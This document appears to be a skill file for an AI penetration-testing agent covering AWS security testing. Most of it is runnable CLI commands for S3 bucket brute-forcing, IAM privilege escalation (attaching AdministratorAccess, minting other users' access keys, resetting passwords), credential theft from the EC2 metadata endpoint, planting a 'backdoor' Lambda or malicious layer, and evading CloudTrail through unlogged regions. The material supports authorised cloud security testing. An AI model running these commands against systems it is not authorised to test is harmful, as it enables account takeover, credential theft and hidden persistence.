---
name: aws
description: AWS security testing covering S3 exposure, IAM misconfiguration, Lambda injection, metadata abuse, STS token abuse, and CloudTrail gaps
---

# AWS Security Testing

AWS environments expose a large attack surface through misconfigured IAM policies, publicly accessible S3 buckets, overly permissive Lambda functions, and instance metadata endpoints. Misconfigurations in cross-account trust, resource policies, and service-linked roles are common and frequently lead to privilege escalation, data exfiltration, and full account compromise.

## Attack Surface

**Scope**
- S3 buckets and objects (public access, ACLs, bucket policies)
- IAM users, roles, policies, and instance profiles
- EC2 instances and their metadata endpoints
- Lambda functions and layers
- STS (Security Token Service) assume-role flows
- CloudTrail, Config, and GuardDuty logging gaps
- RDS, DynamoDB, SQS, SNS, and other managed services
- EKS, ECS, and Fargate workloads
- CloudFront distributions and origin access

**Entry Points**
- Compromised IAM credentials (access keys in code repos, env vars, instance metadata)
- Publicly accessible S3 buckets
- SSRF to EC2 metadata endpoint (169.254.169.254)
- Overly permissive cross-account trust relationships
- Exposed Lambda function URLs or API Gateway endpoints
- Leaked credentials in CI/CD pipelines, .env files, or error logs

## Key Vulnerabilities

### S3 Bucket Exposure

**Enumeration:**
```bash
# List publicly accessible buckets
aws s3 ls s3://<bucket-name> --no-sign-request

# Brute-force bucket names
python3 s3scanner.py --bucket <target-domain>
# Or with wordlists
for word in $(cat bucket-names.txt); do
  aws s3 ls s3://${word} --no-sign-request 2>/dev/null && echo "PUBLIC: ${word}"
done

# Check bucket policy
aws s3api get-bucket-policy --bucket <bucket-name>

# Check ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api get-object-acl --bucket <bucket-name> --key <object-key>

# List all objects
aws s3api list-objects-v2 --bucket <bucket-name> --max-keys 1000
```

**Common Misconfigurations:**
```bash
# Public read via ACL
aws s3api put-bucket-acl --bucket <name> --acl public-read  # Verify if allowed

# Public via bucket policy with Principal: "*"
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::<bucket>/*"
}

# Block Public Access settings overridden
aws s3api get-public-access-block --bucket <name>

# Check for write access
aws s3 cp test.txt s3://<bucket-name>/test.txt --no-sign-request
aws s3api put-object --bucket <bucket-name> --key test.txt --body test.txt
```

### IAM Misconfiguration

**Enumeration:**
```bash
# List all IAM users
aws iam list-users

# List attached policies for a user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# List all roles (look for cross-account)
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | contains("arn:aws:iam::"))'

# Check current identity
aws sts get-caller-identity

# Check permissions boundary
aws iam list-entities-for-policy --policy-arn <arn>
```

**Privilege Escalation Paths:**
```bash
# iam:PassRole + Lambda create
aws lambda create-function --function-name privesc \
  --runtime python3.9 --role arn:aws:iam::<account>:role/<admin-role> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip

# iam:CreatePolicyVersion (set as default)
aws iam create-policy-version --policy-arn <arn> \
  --policy-document file://admin-policy.json --set-as-default

# iam:SetDefaultPolicyVersion (switch to existing permissive version)
aws iam set-default-policy-version --policy-arn <arn> --version-id v1

# sts:AssumeRole with external ID bypass
aws sts assume-role --role-arn arn:aws:iam::<account>:role/<role> \
  --role-session-name attacker --external-id <known-id>

# iam:CreateAccessKey (on other users)
aws iam create-access-key --user-name <target-user>

# iam:UpdateLoginProfile (set password)
aws iam update-login-profile --user-name <target-user> --password <pass>

# iam:AttachUserPolicy (attach admin)
aws iam attach-user-policy --user-name <user> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### EC2 Instance Metadata

**IMDSv1 (vulnerable to SSRF):**
```bash
# No authentication required - just HTTP GET
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
curl http://169.254.169.254/latest/user-data/
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/security-groups
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

**IMDSv2 (requires session token):**
```bash
# Step 1: Get session token (requires PUT, hop limit of 1 blocks SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token for metadata requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Metadata Data Extraction:**
```bash
# Get instance identity
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# Get user data (often contains scripts with credentials)
curl http://169.254.169.254/latest/user-data/
# Base64 decode if needed
curl http://169.254.169.254/latest/user-data/ | base64 -d

# Get IAM credentials (temporary, auto-rotated)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Use returned AccessKeyId, SecretAccessKey, Token with AWS CLI
```

### Lambda Injection & Abuse

```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name <name>

# Check environment variables (often contain secrets)
aws lambda get-function-configuration --function-name <name> | jq '.Environment.Variables'

# Invoke function
aws lambda invoke --function-name <name> --payload '{"key": "value"}' output.json

# Lambda with function URL (public endpoint)
aws lambda get-function-url-config --function-name <name>

# Create Lambda with privileged role (if iam:PassRole + lambda:CreateFunction)
aws lambda create-function --function-name backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::<account>:role/<privileged-role> \
  --handler index.handler \
  --zip-file fileb://lambda.zip \
  --environment "Variables={AWS_ACCESS_KEY_ID=...,AWS_SECRET_ACCESS_KEY=...}"

# Lambda layer injection (shared across functions)
aws lambda publish-layer-version --layer-name <name> --zip-file fileb://malicious.zip
```

### STS Token Abuse

```bash
# Check current token
aws sts get-caller-identity

# Decode STS token (contains account ID, user ID, session name)
aws sts decode-authorization-message --encoded-message <token>

# Assume role (if allowed)
aws sts assume-role \
  --role-arn arn:aws:iam::<target-account>:role/<role-name> \
  --role-session-name compromised \
  --external-id <required-external-id>

# Use assumed role credentials
export AWS_ACCESS_KEY_ID=<from-assume-role>
export AWS_SECRET_ACCESS_KEY=<from-assume-role>
export AWS_SESSION_TOKEN=<from-assume-role>

# Federation token abuse
aws sts get-federation-token --name <user> --policy-document file://policy.json
```

### CloudTrail & Logging Gaps

```bash
# Check if CloudTrail is enabled
aws cloudtrail describe-trails

# Look for trails that don't log all regions
aws cloudtrail get-trail --name <trail>
aws cloudtrail get-trail-status --name <trail>

# Check for S3 bucket logging gaps
aws s3api get-bucket-logging --bucket <name>

# Identify events that aren't logged
aws cloudtrail lookup-attributes --attribute-key EventName --attribute-value <event>

# Check for log file validation (tamper detection)
aws cloudtrail describe-trails | jq '.trailList[].LogFileValidationEnabled'

# VPC Flow Logs
aws ec2 describe-flow-logs
```

## Bypass Techniques

**Credential Harvesting**
- Search code repos for AWS access keys: `AKIA[0-9A-Z]{16}`
- Check `.aws/credentials`, environment variables, Lambda env vars
- Instance metadata (IMDSv1 especially) via SSRF

**Cross-Account Abuse**
- Trust policies with `Principal: "*"` or wildcard account IDs
- External ID required but known/reusable
- Resource-based policies allowing cross-account access

**Region-Based Evasion**
- Services in regions without CloudTrail coverage
- Resources created in regions where GuardDuty is not enabled
- Region-specific service configurations

## Testing Methodology

1. **Credential discovery** - Check for leaked keys in repos, env vars, instance metadata
2. **Identity mapping** - `aws sts get-caller-identity` to understand current context
3. **Permission enumeration** - `aws iam simulate-principal-policy` or brute-force API calls
4. **S3 audit** - List all buckets, check public access, test write capabilities
5. **Metadata probe** - Test IMDSv1 vs v2, extract IAM credentials if possible
6. **Privilege escalation** - Test iam:PassRole, policy versioning, cross-account assume
7. **Logging gaps** - Verify CloudTrail coverage, check for unlogged regions/services
8. **Lateral movement** - Use harvested credentials to access other services and accounts

## Tools

- **AWS CLI** - Primary tool for all AWS API interactions
- **s3scanner** - S3 bucket enumeration and public access detection
- **pacu** - AWS exploitation framework with modular attack modules
- **cloudmapper** - AWS visualization and security analysis
- **Prowler** - AWS security assessment and CIS benchmarking
- **ScoutSuite** - Multi-cloud security auditing
- **enumerate-iam** - Brute-force IAM permissions for a given principal

## Validation Requirements

- Prove access to resources beyond intended scope (cross-account S3, other users' data)
- Demonstrate privilege escalation path from initial access to elevated permissions
- Show actual credential extraction from metadata or S3 and verify access level
- Document specific IAM policy statements that enabled the bypass
- For S3: show actual object read/write with request IDs
- Confirm logging gaps by performing logged vs unlogged actions

## False Positives

- S3 bucket listed as public but blocked by S3 Block Public Access settings at account level
- IAM permission granted but enforced by permission boundaries or SCPs
- IMDSv2 required but hop limit of 1 prevents SSRF exploitation
- CloudTrail disabled in one region but organizational trail covers it
- Cross-account trust exists but requires external ID that rotates

## Impact

- Full AWS account takeover from leaked access keys or metadata endpoint SSRF
- Data exfiltration from publicly accessible S3 buckets
- Cryptocurrency mining from hijacked EC2 instances or Lambda functions
- Lateral movement across AWS accounts via cross-account trust abuse
- Compliance violations from logging gaps and missing CloudTrail coverage
- Supply chain attacks via Lambda layer or shared AMI manipulation

## Pro Tips

1. Always check `aws sts get-caller-identity` first - it reveals account ID and principal type
2. IMDSv1 is still commonly enabled; test it from any SSRF-capable endpoint
3. S3 Block Public Access at account level overrides individual bucket policies
4. Lambda environment variables are a goldmine for credentials and API keys
5. `aws iam simulate-principal-policy` is safer than brute-forcing API calls for permission testing
6. Cross-account roles with `sts:ExternalId` - the external ID is not a secret, just a confused deputy mitigation
7. Check for `Resource: "*"` in IAM policies - wildcard resources with sensitive actions are the most common misconfig
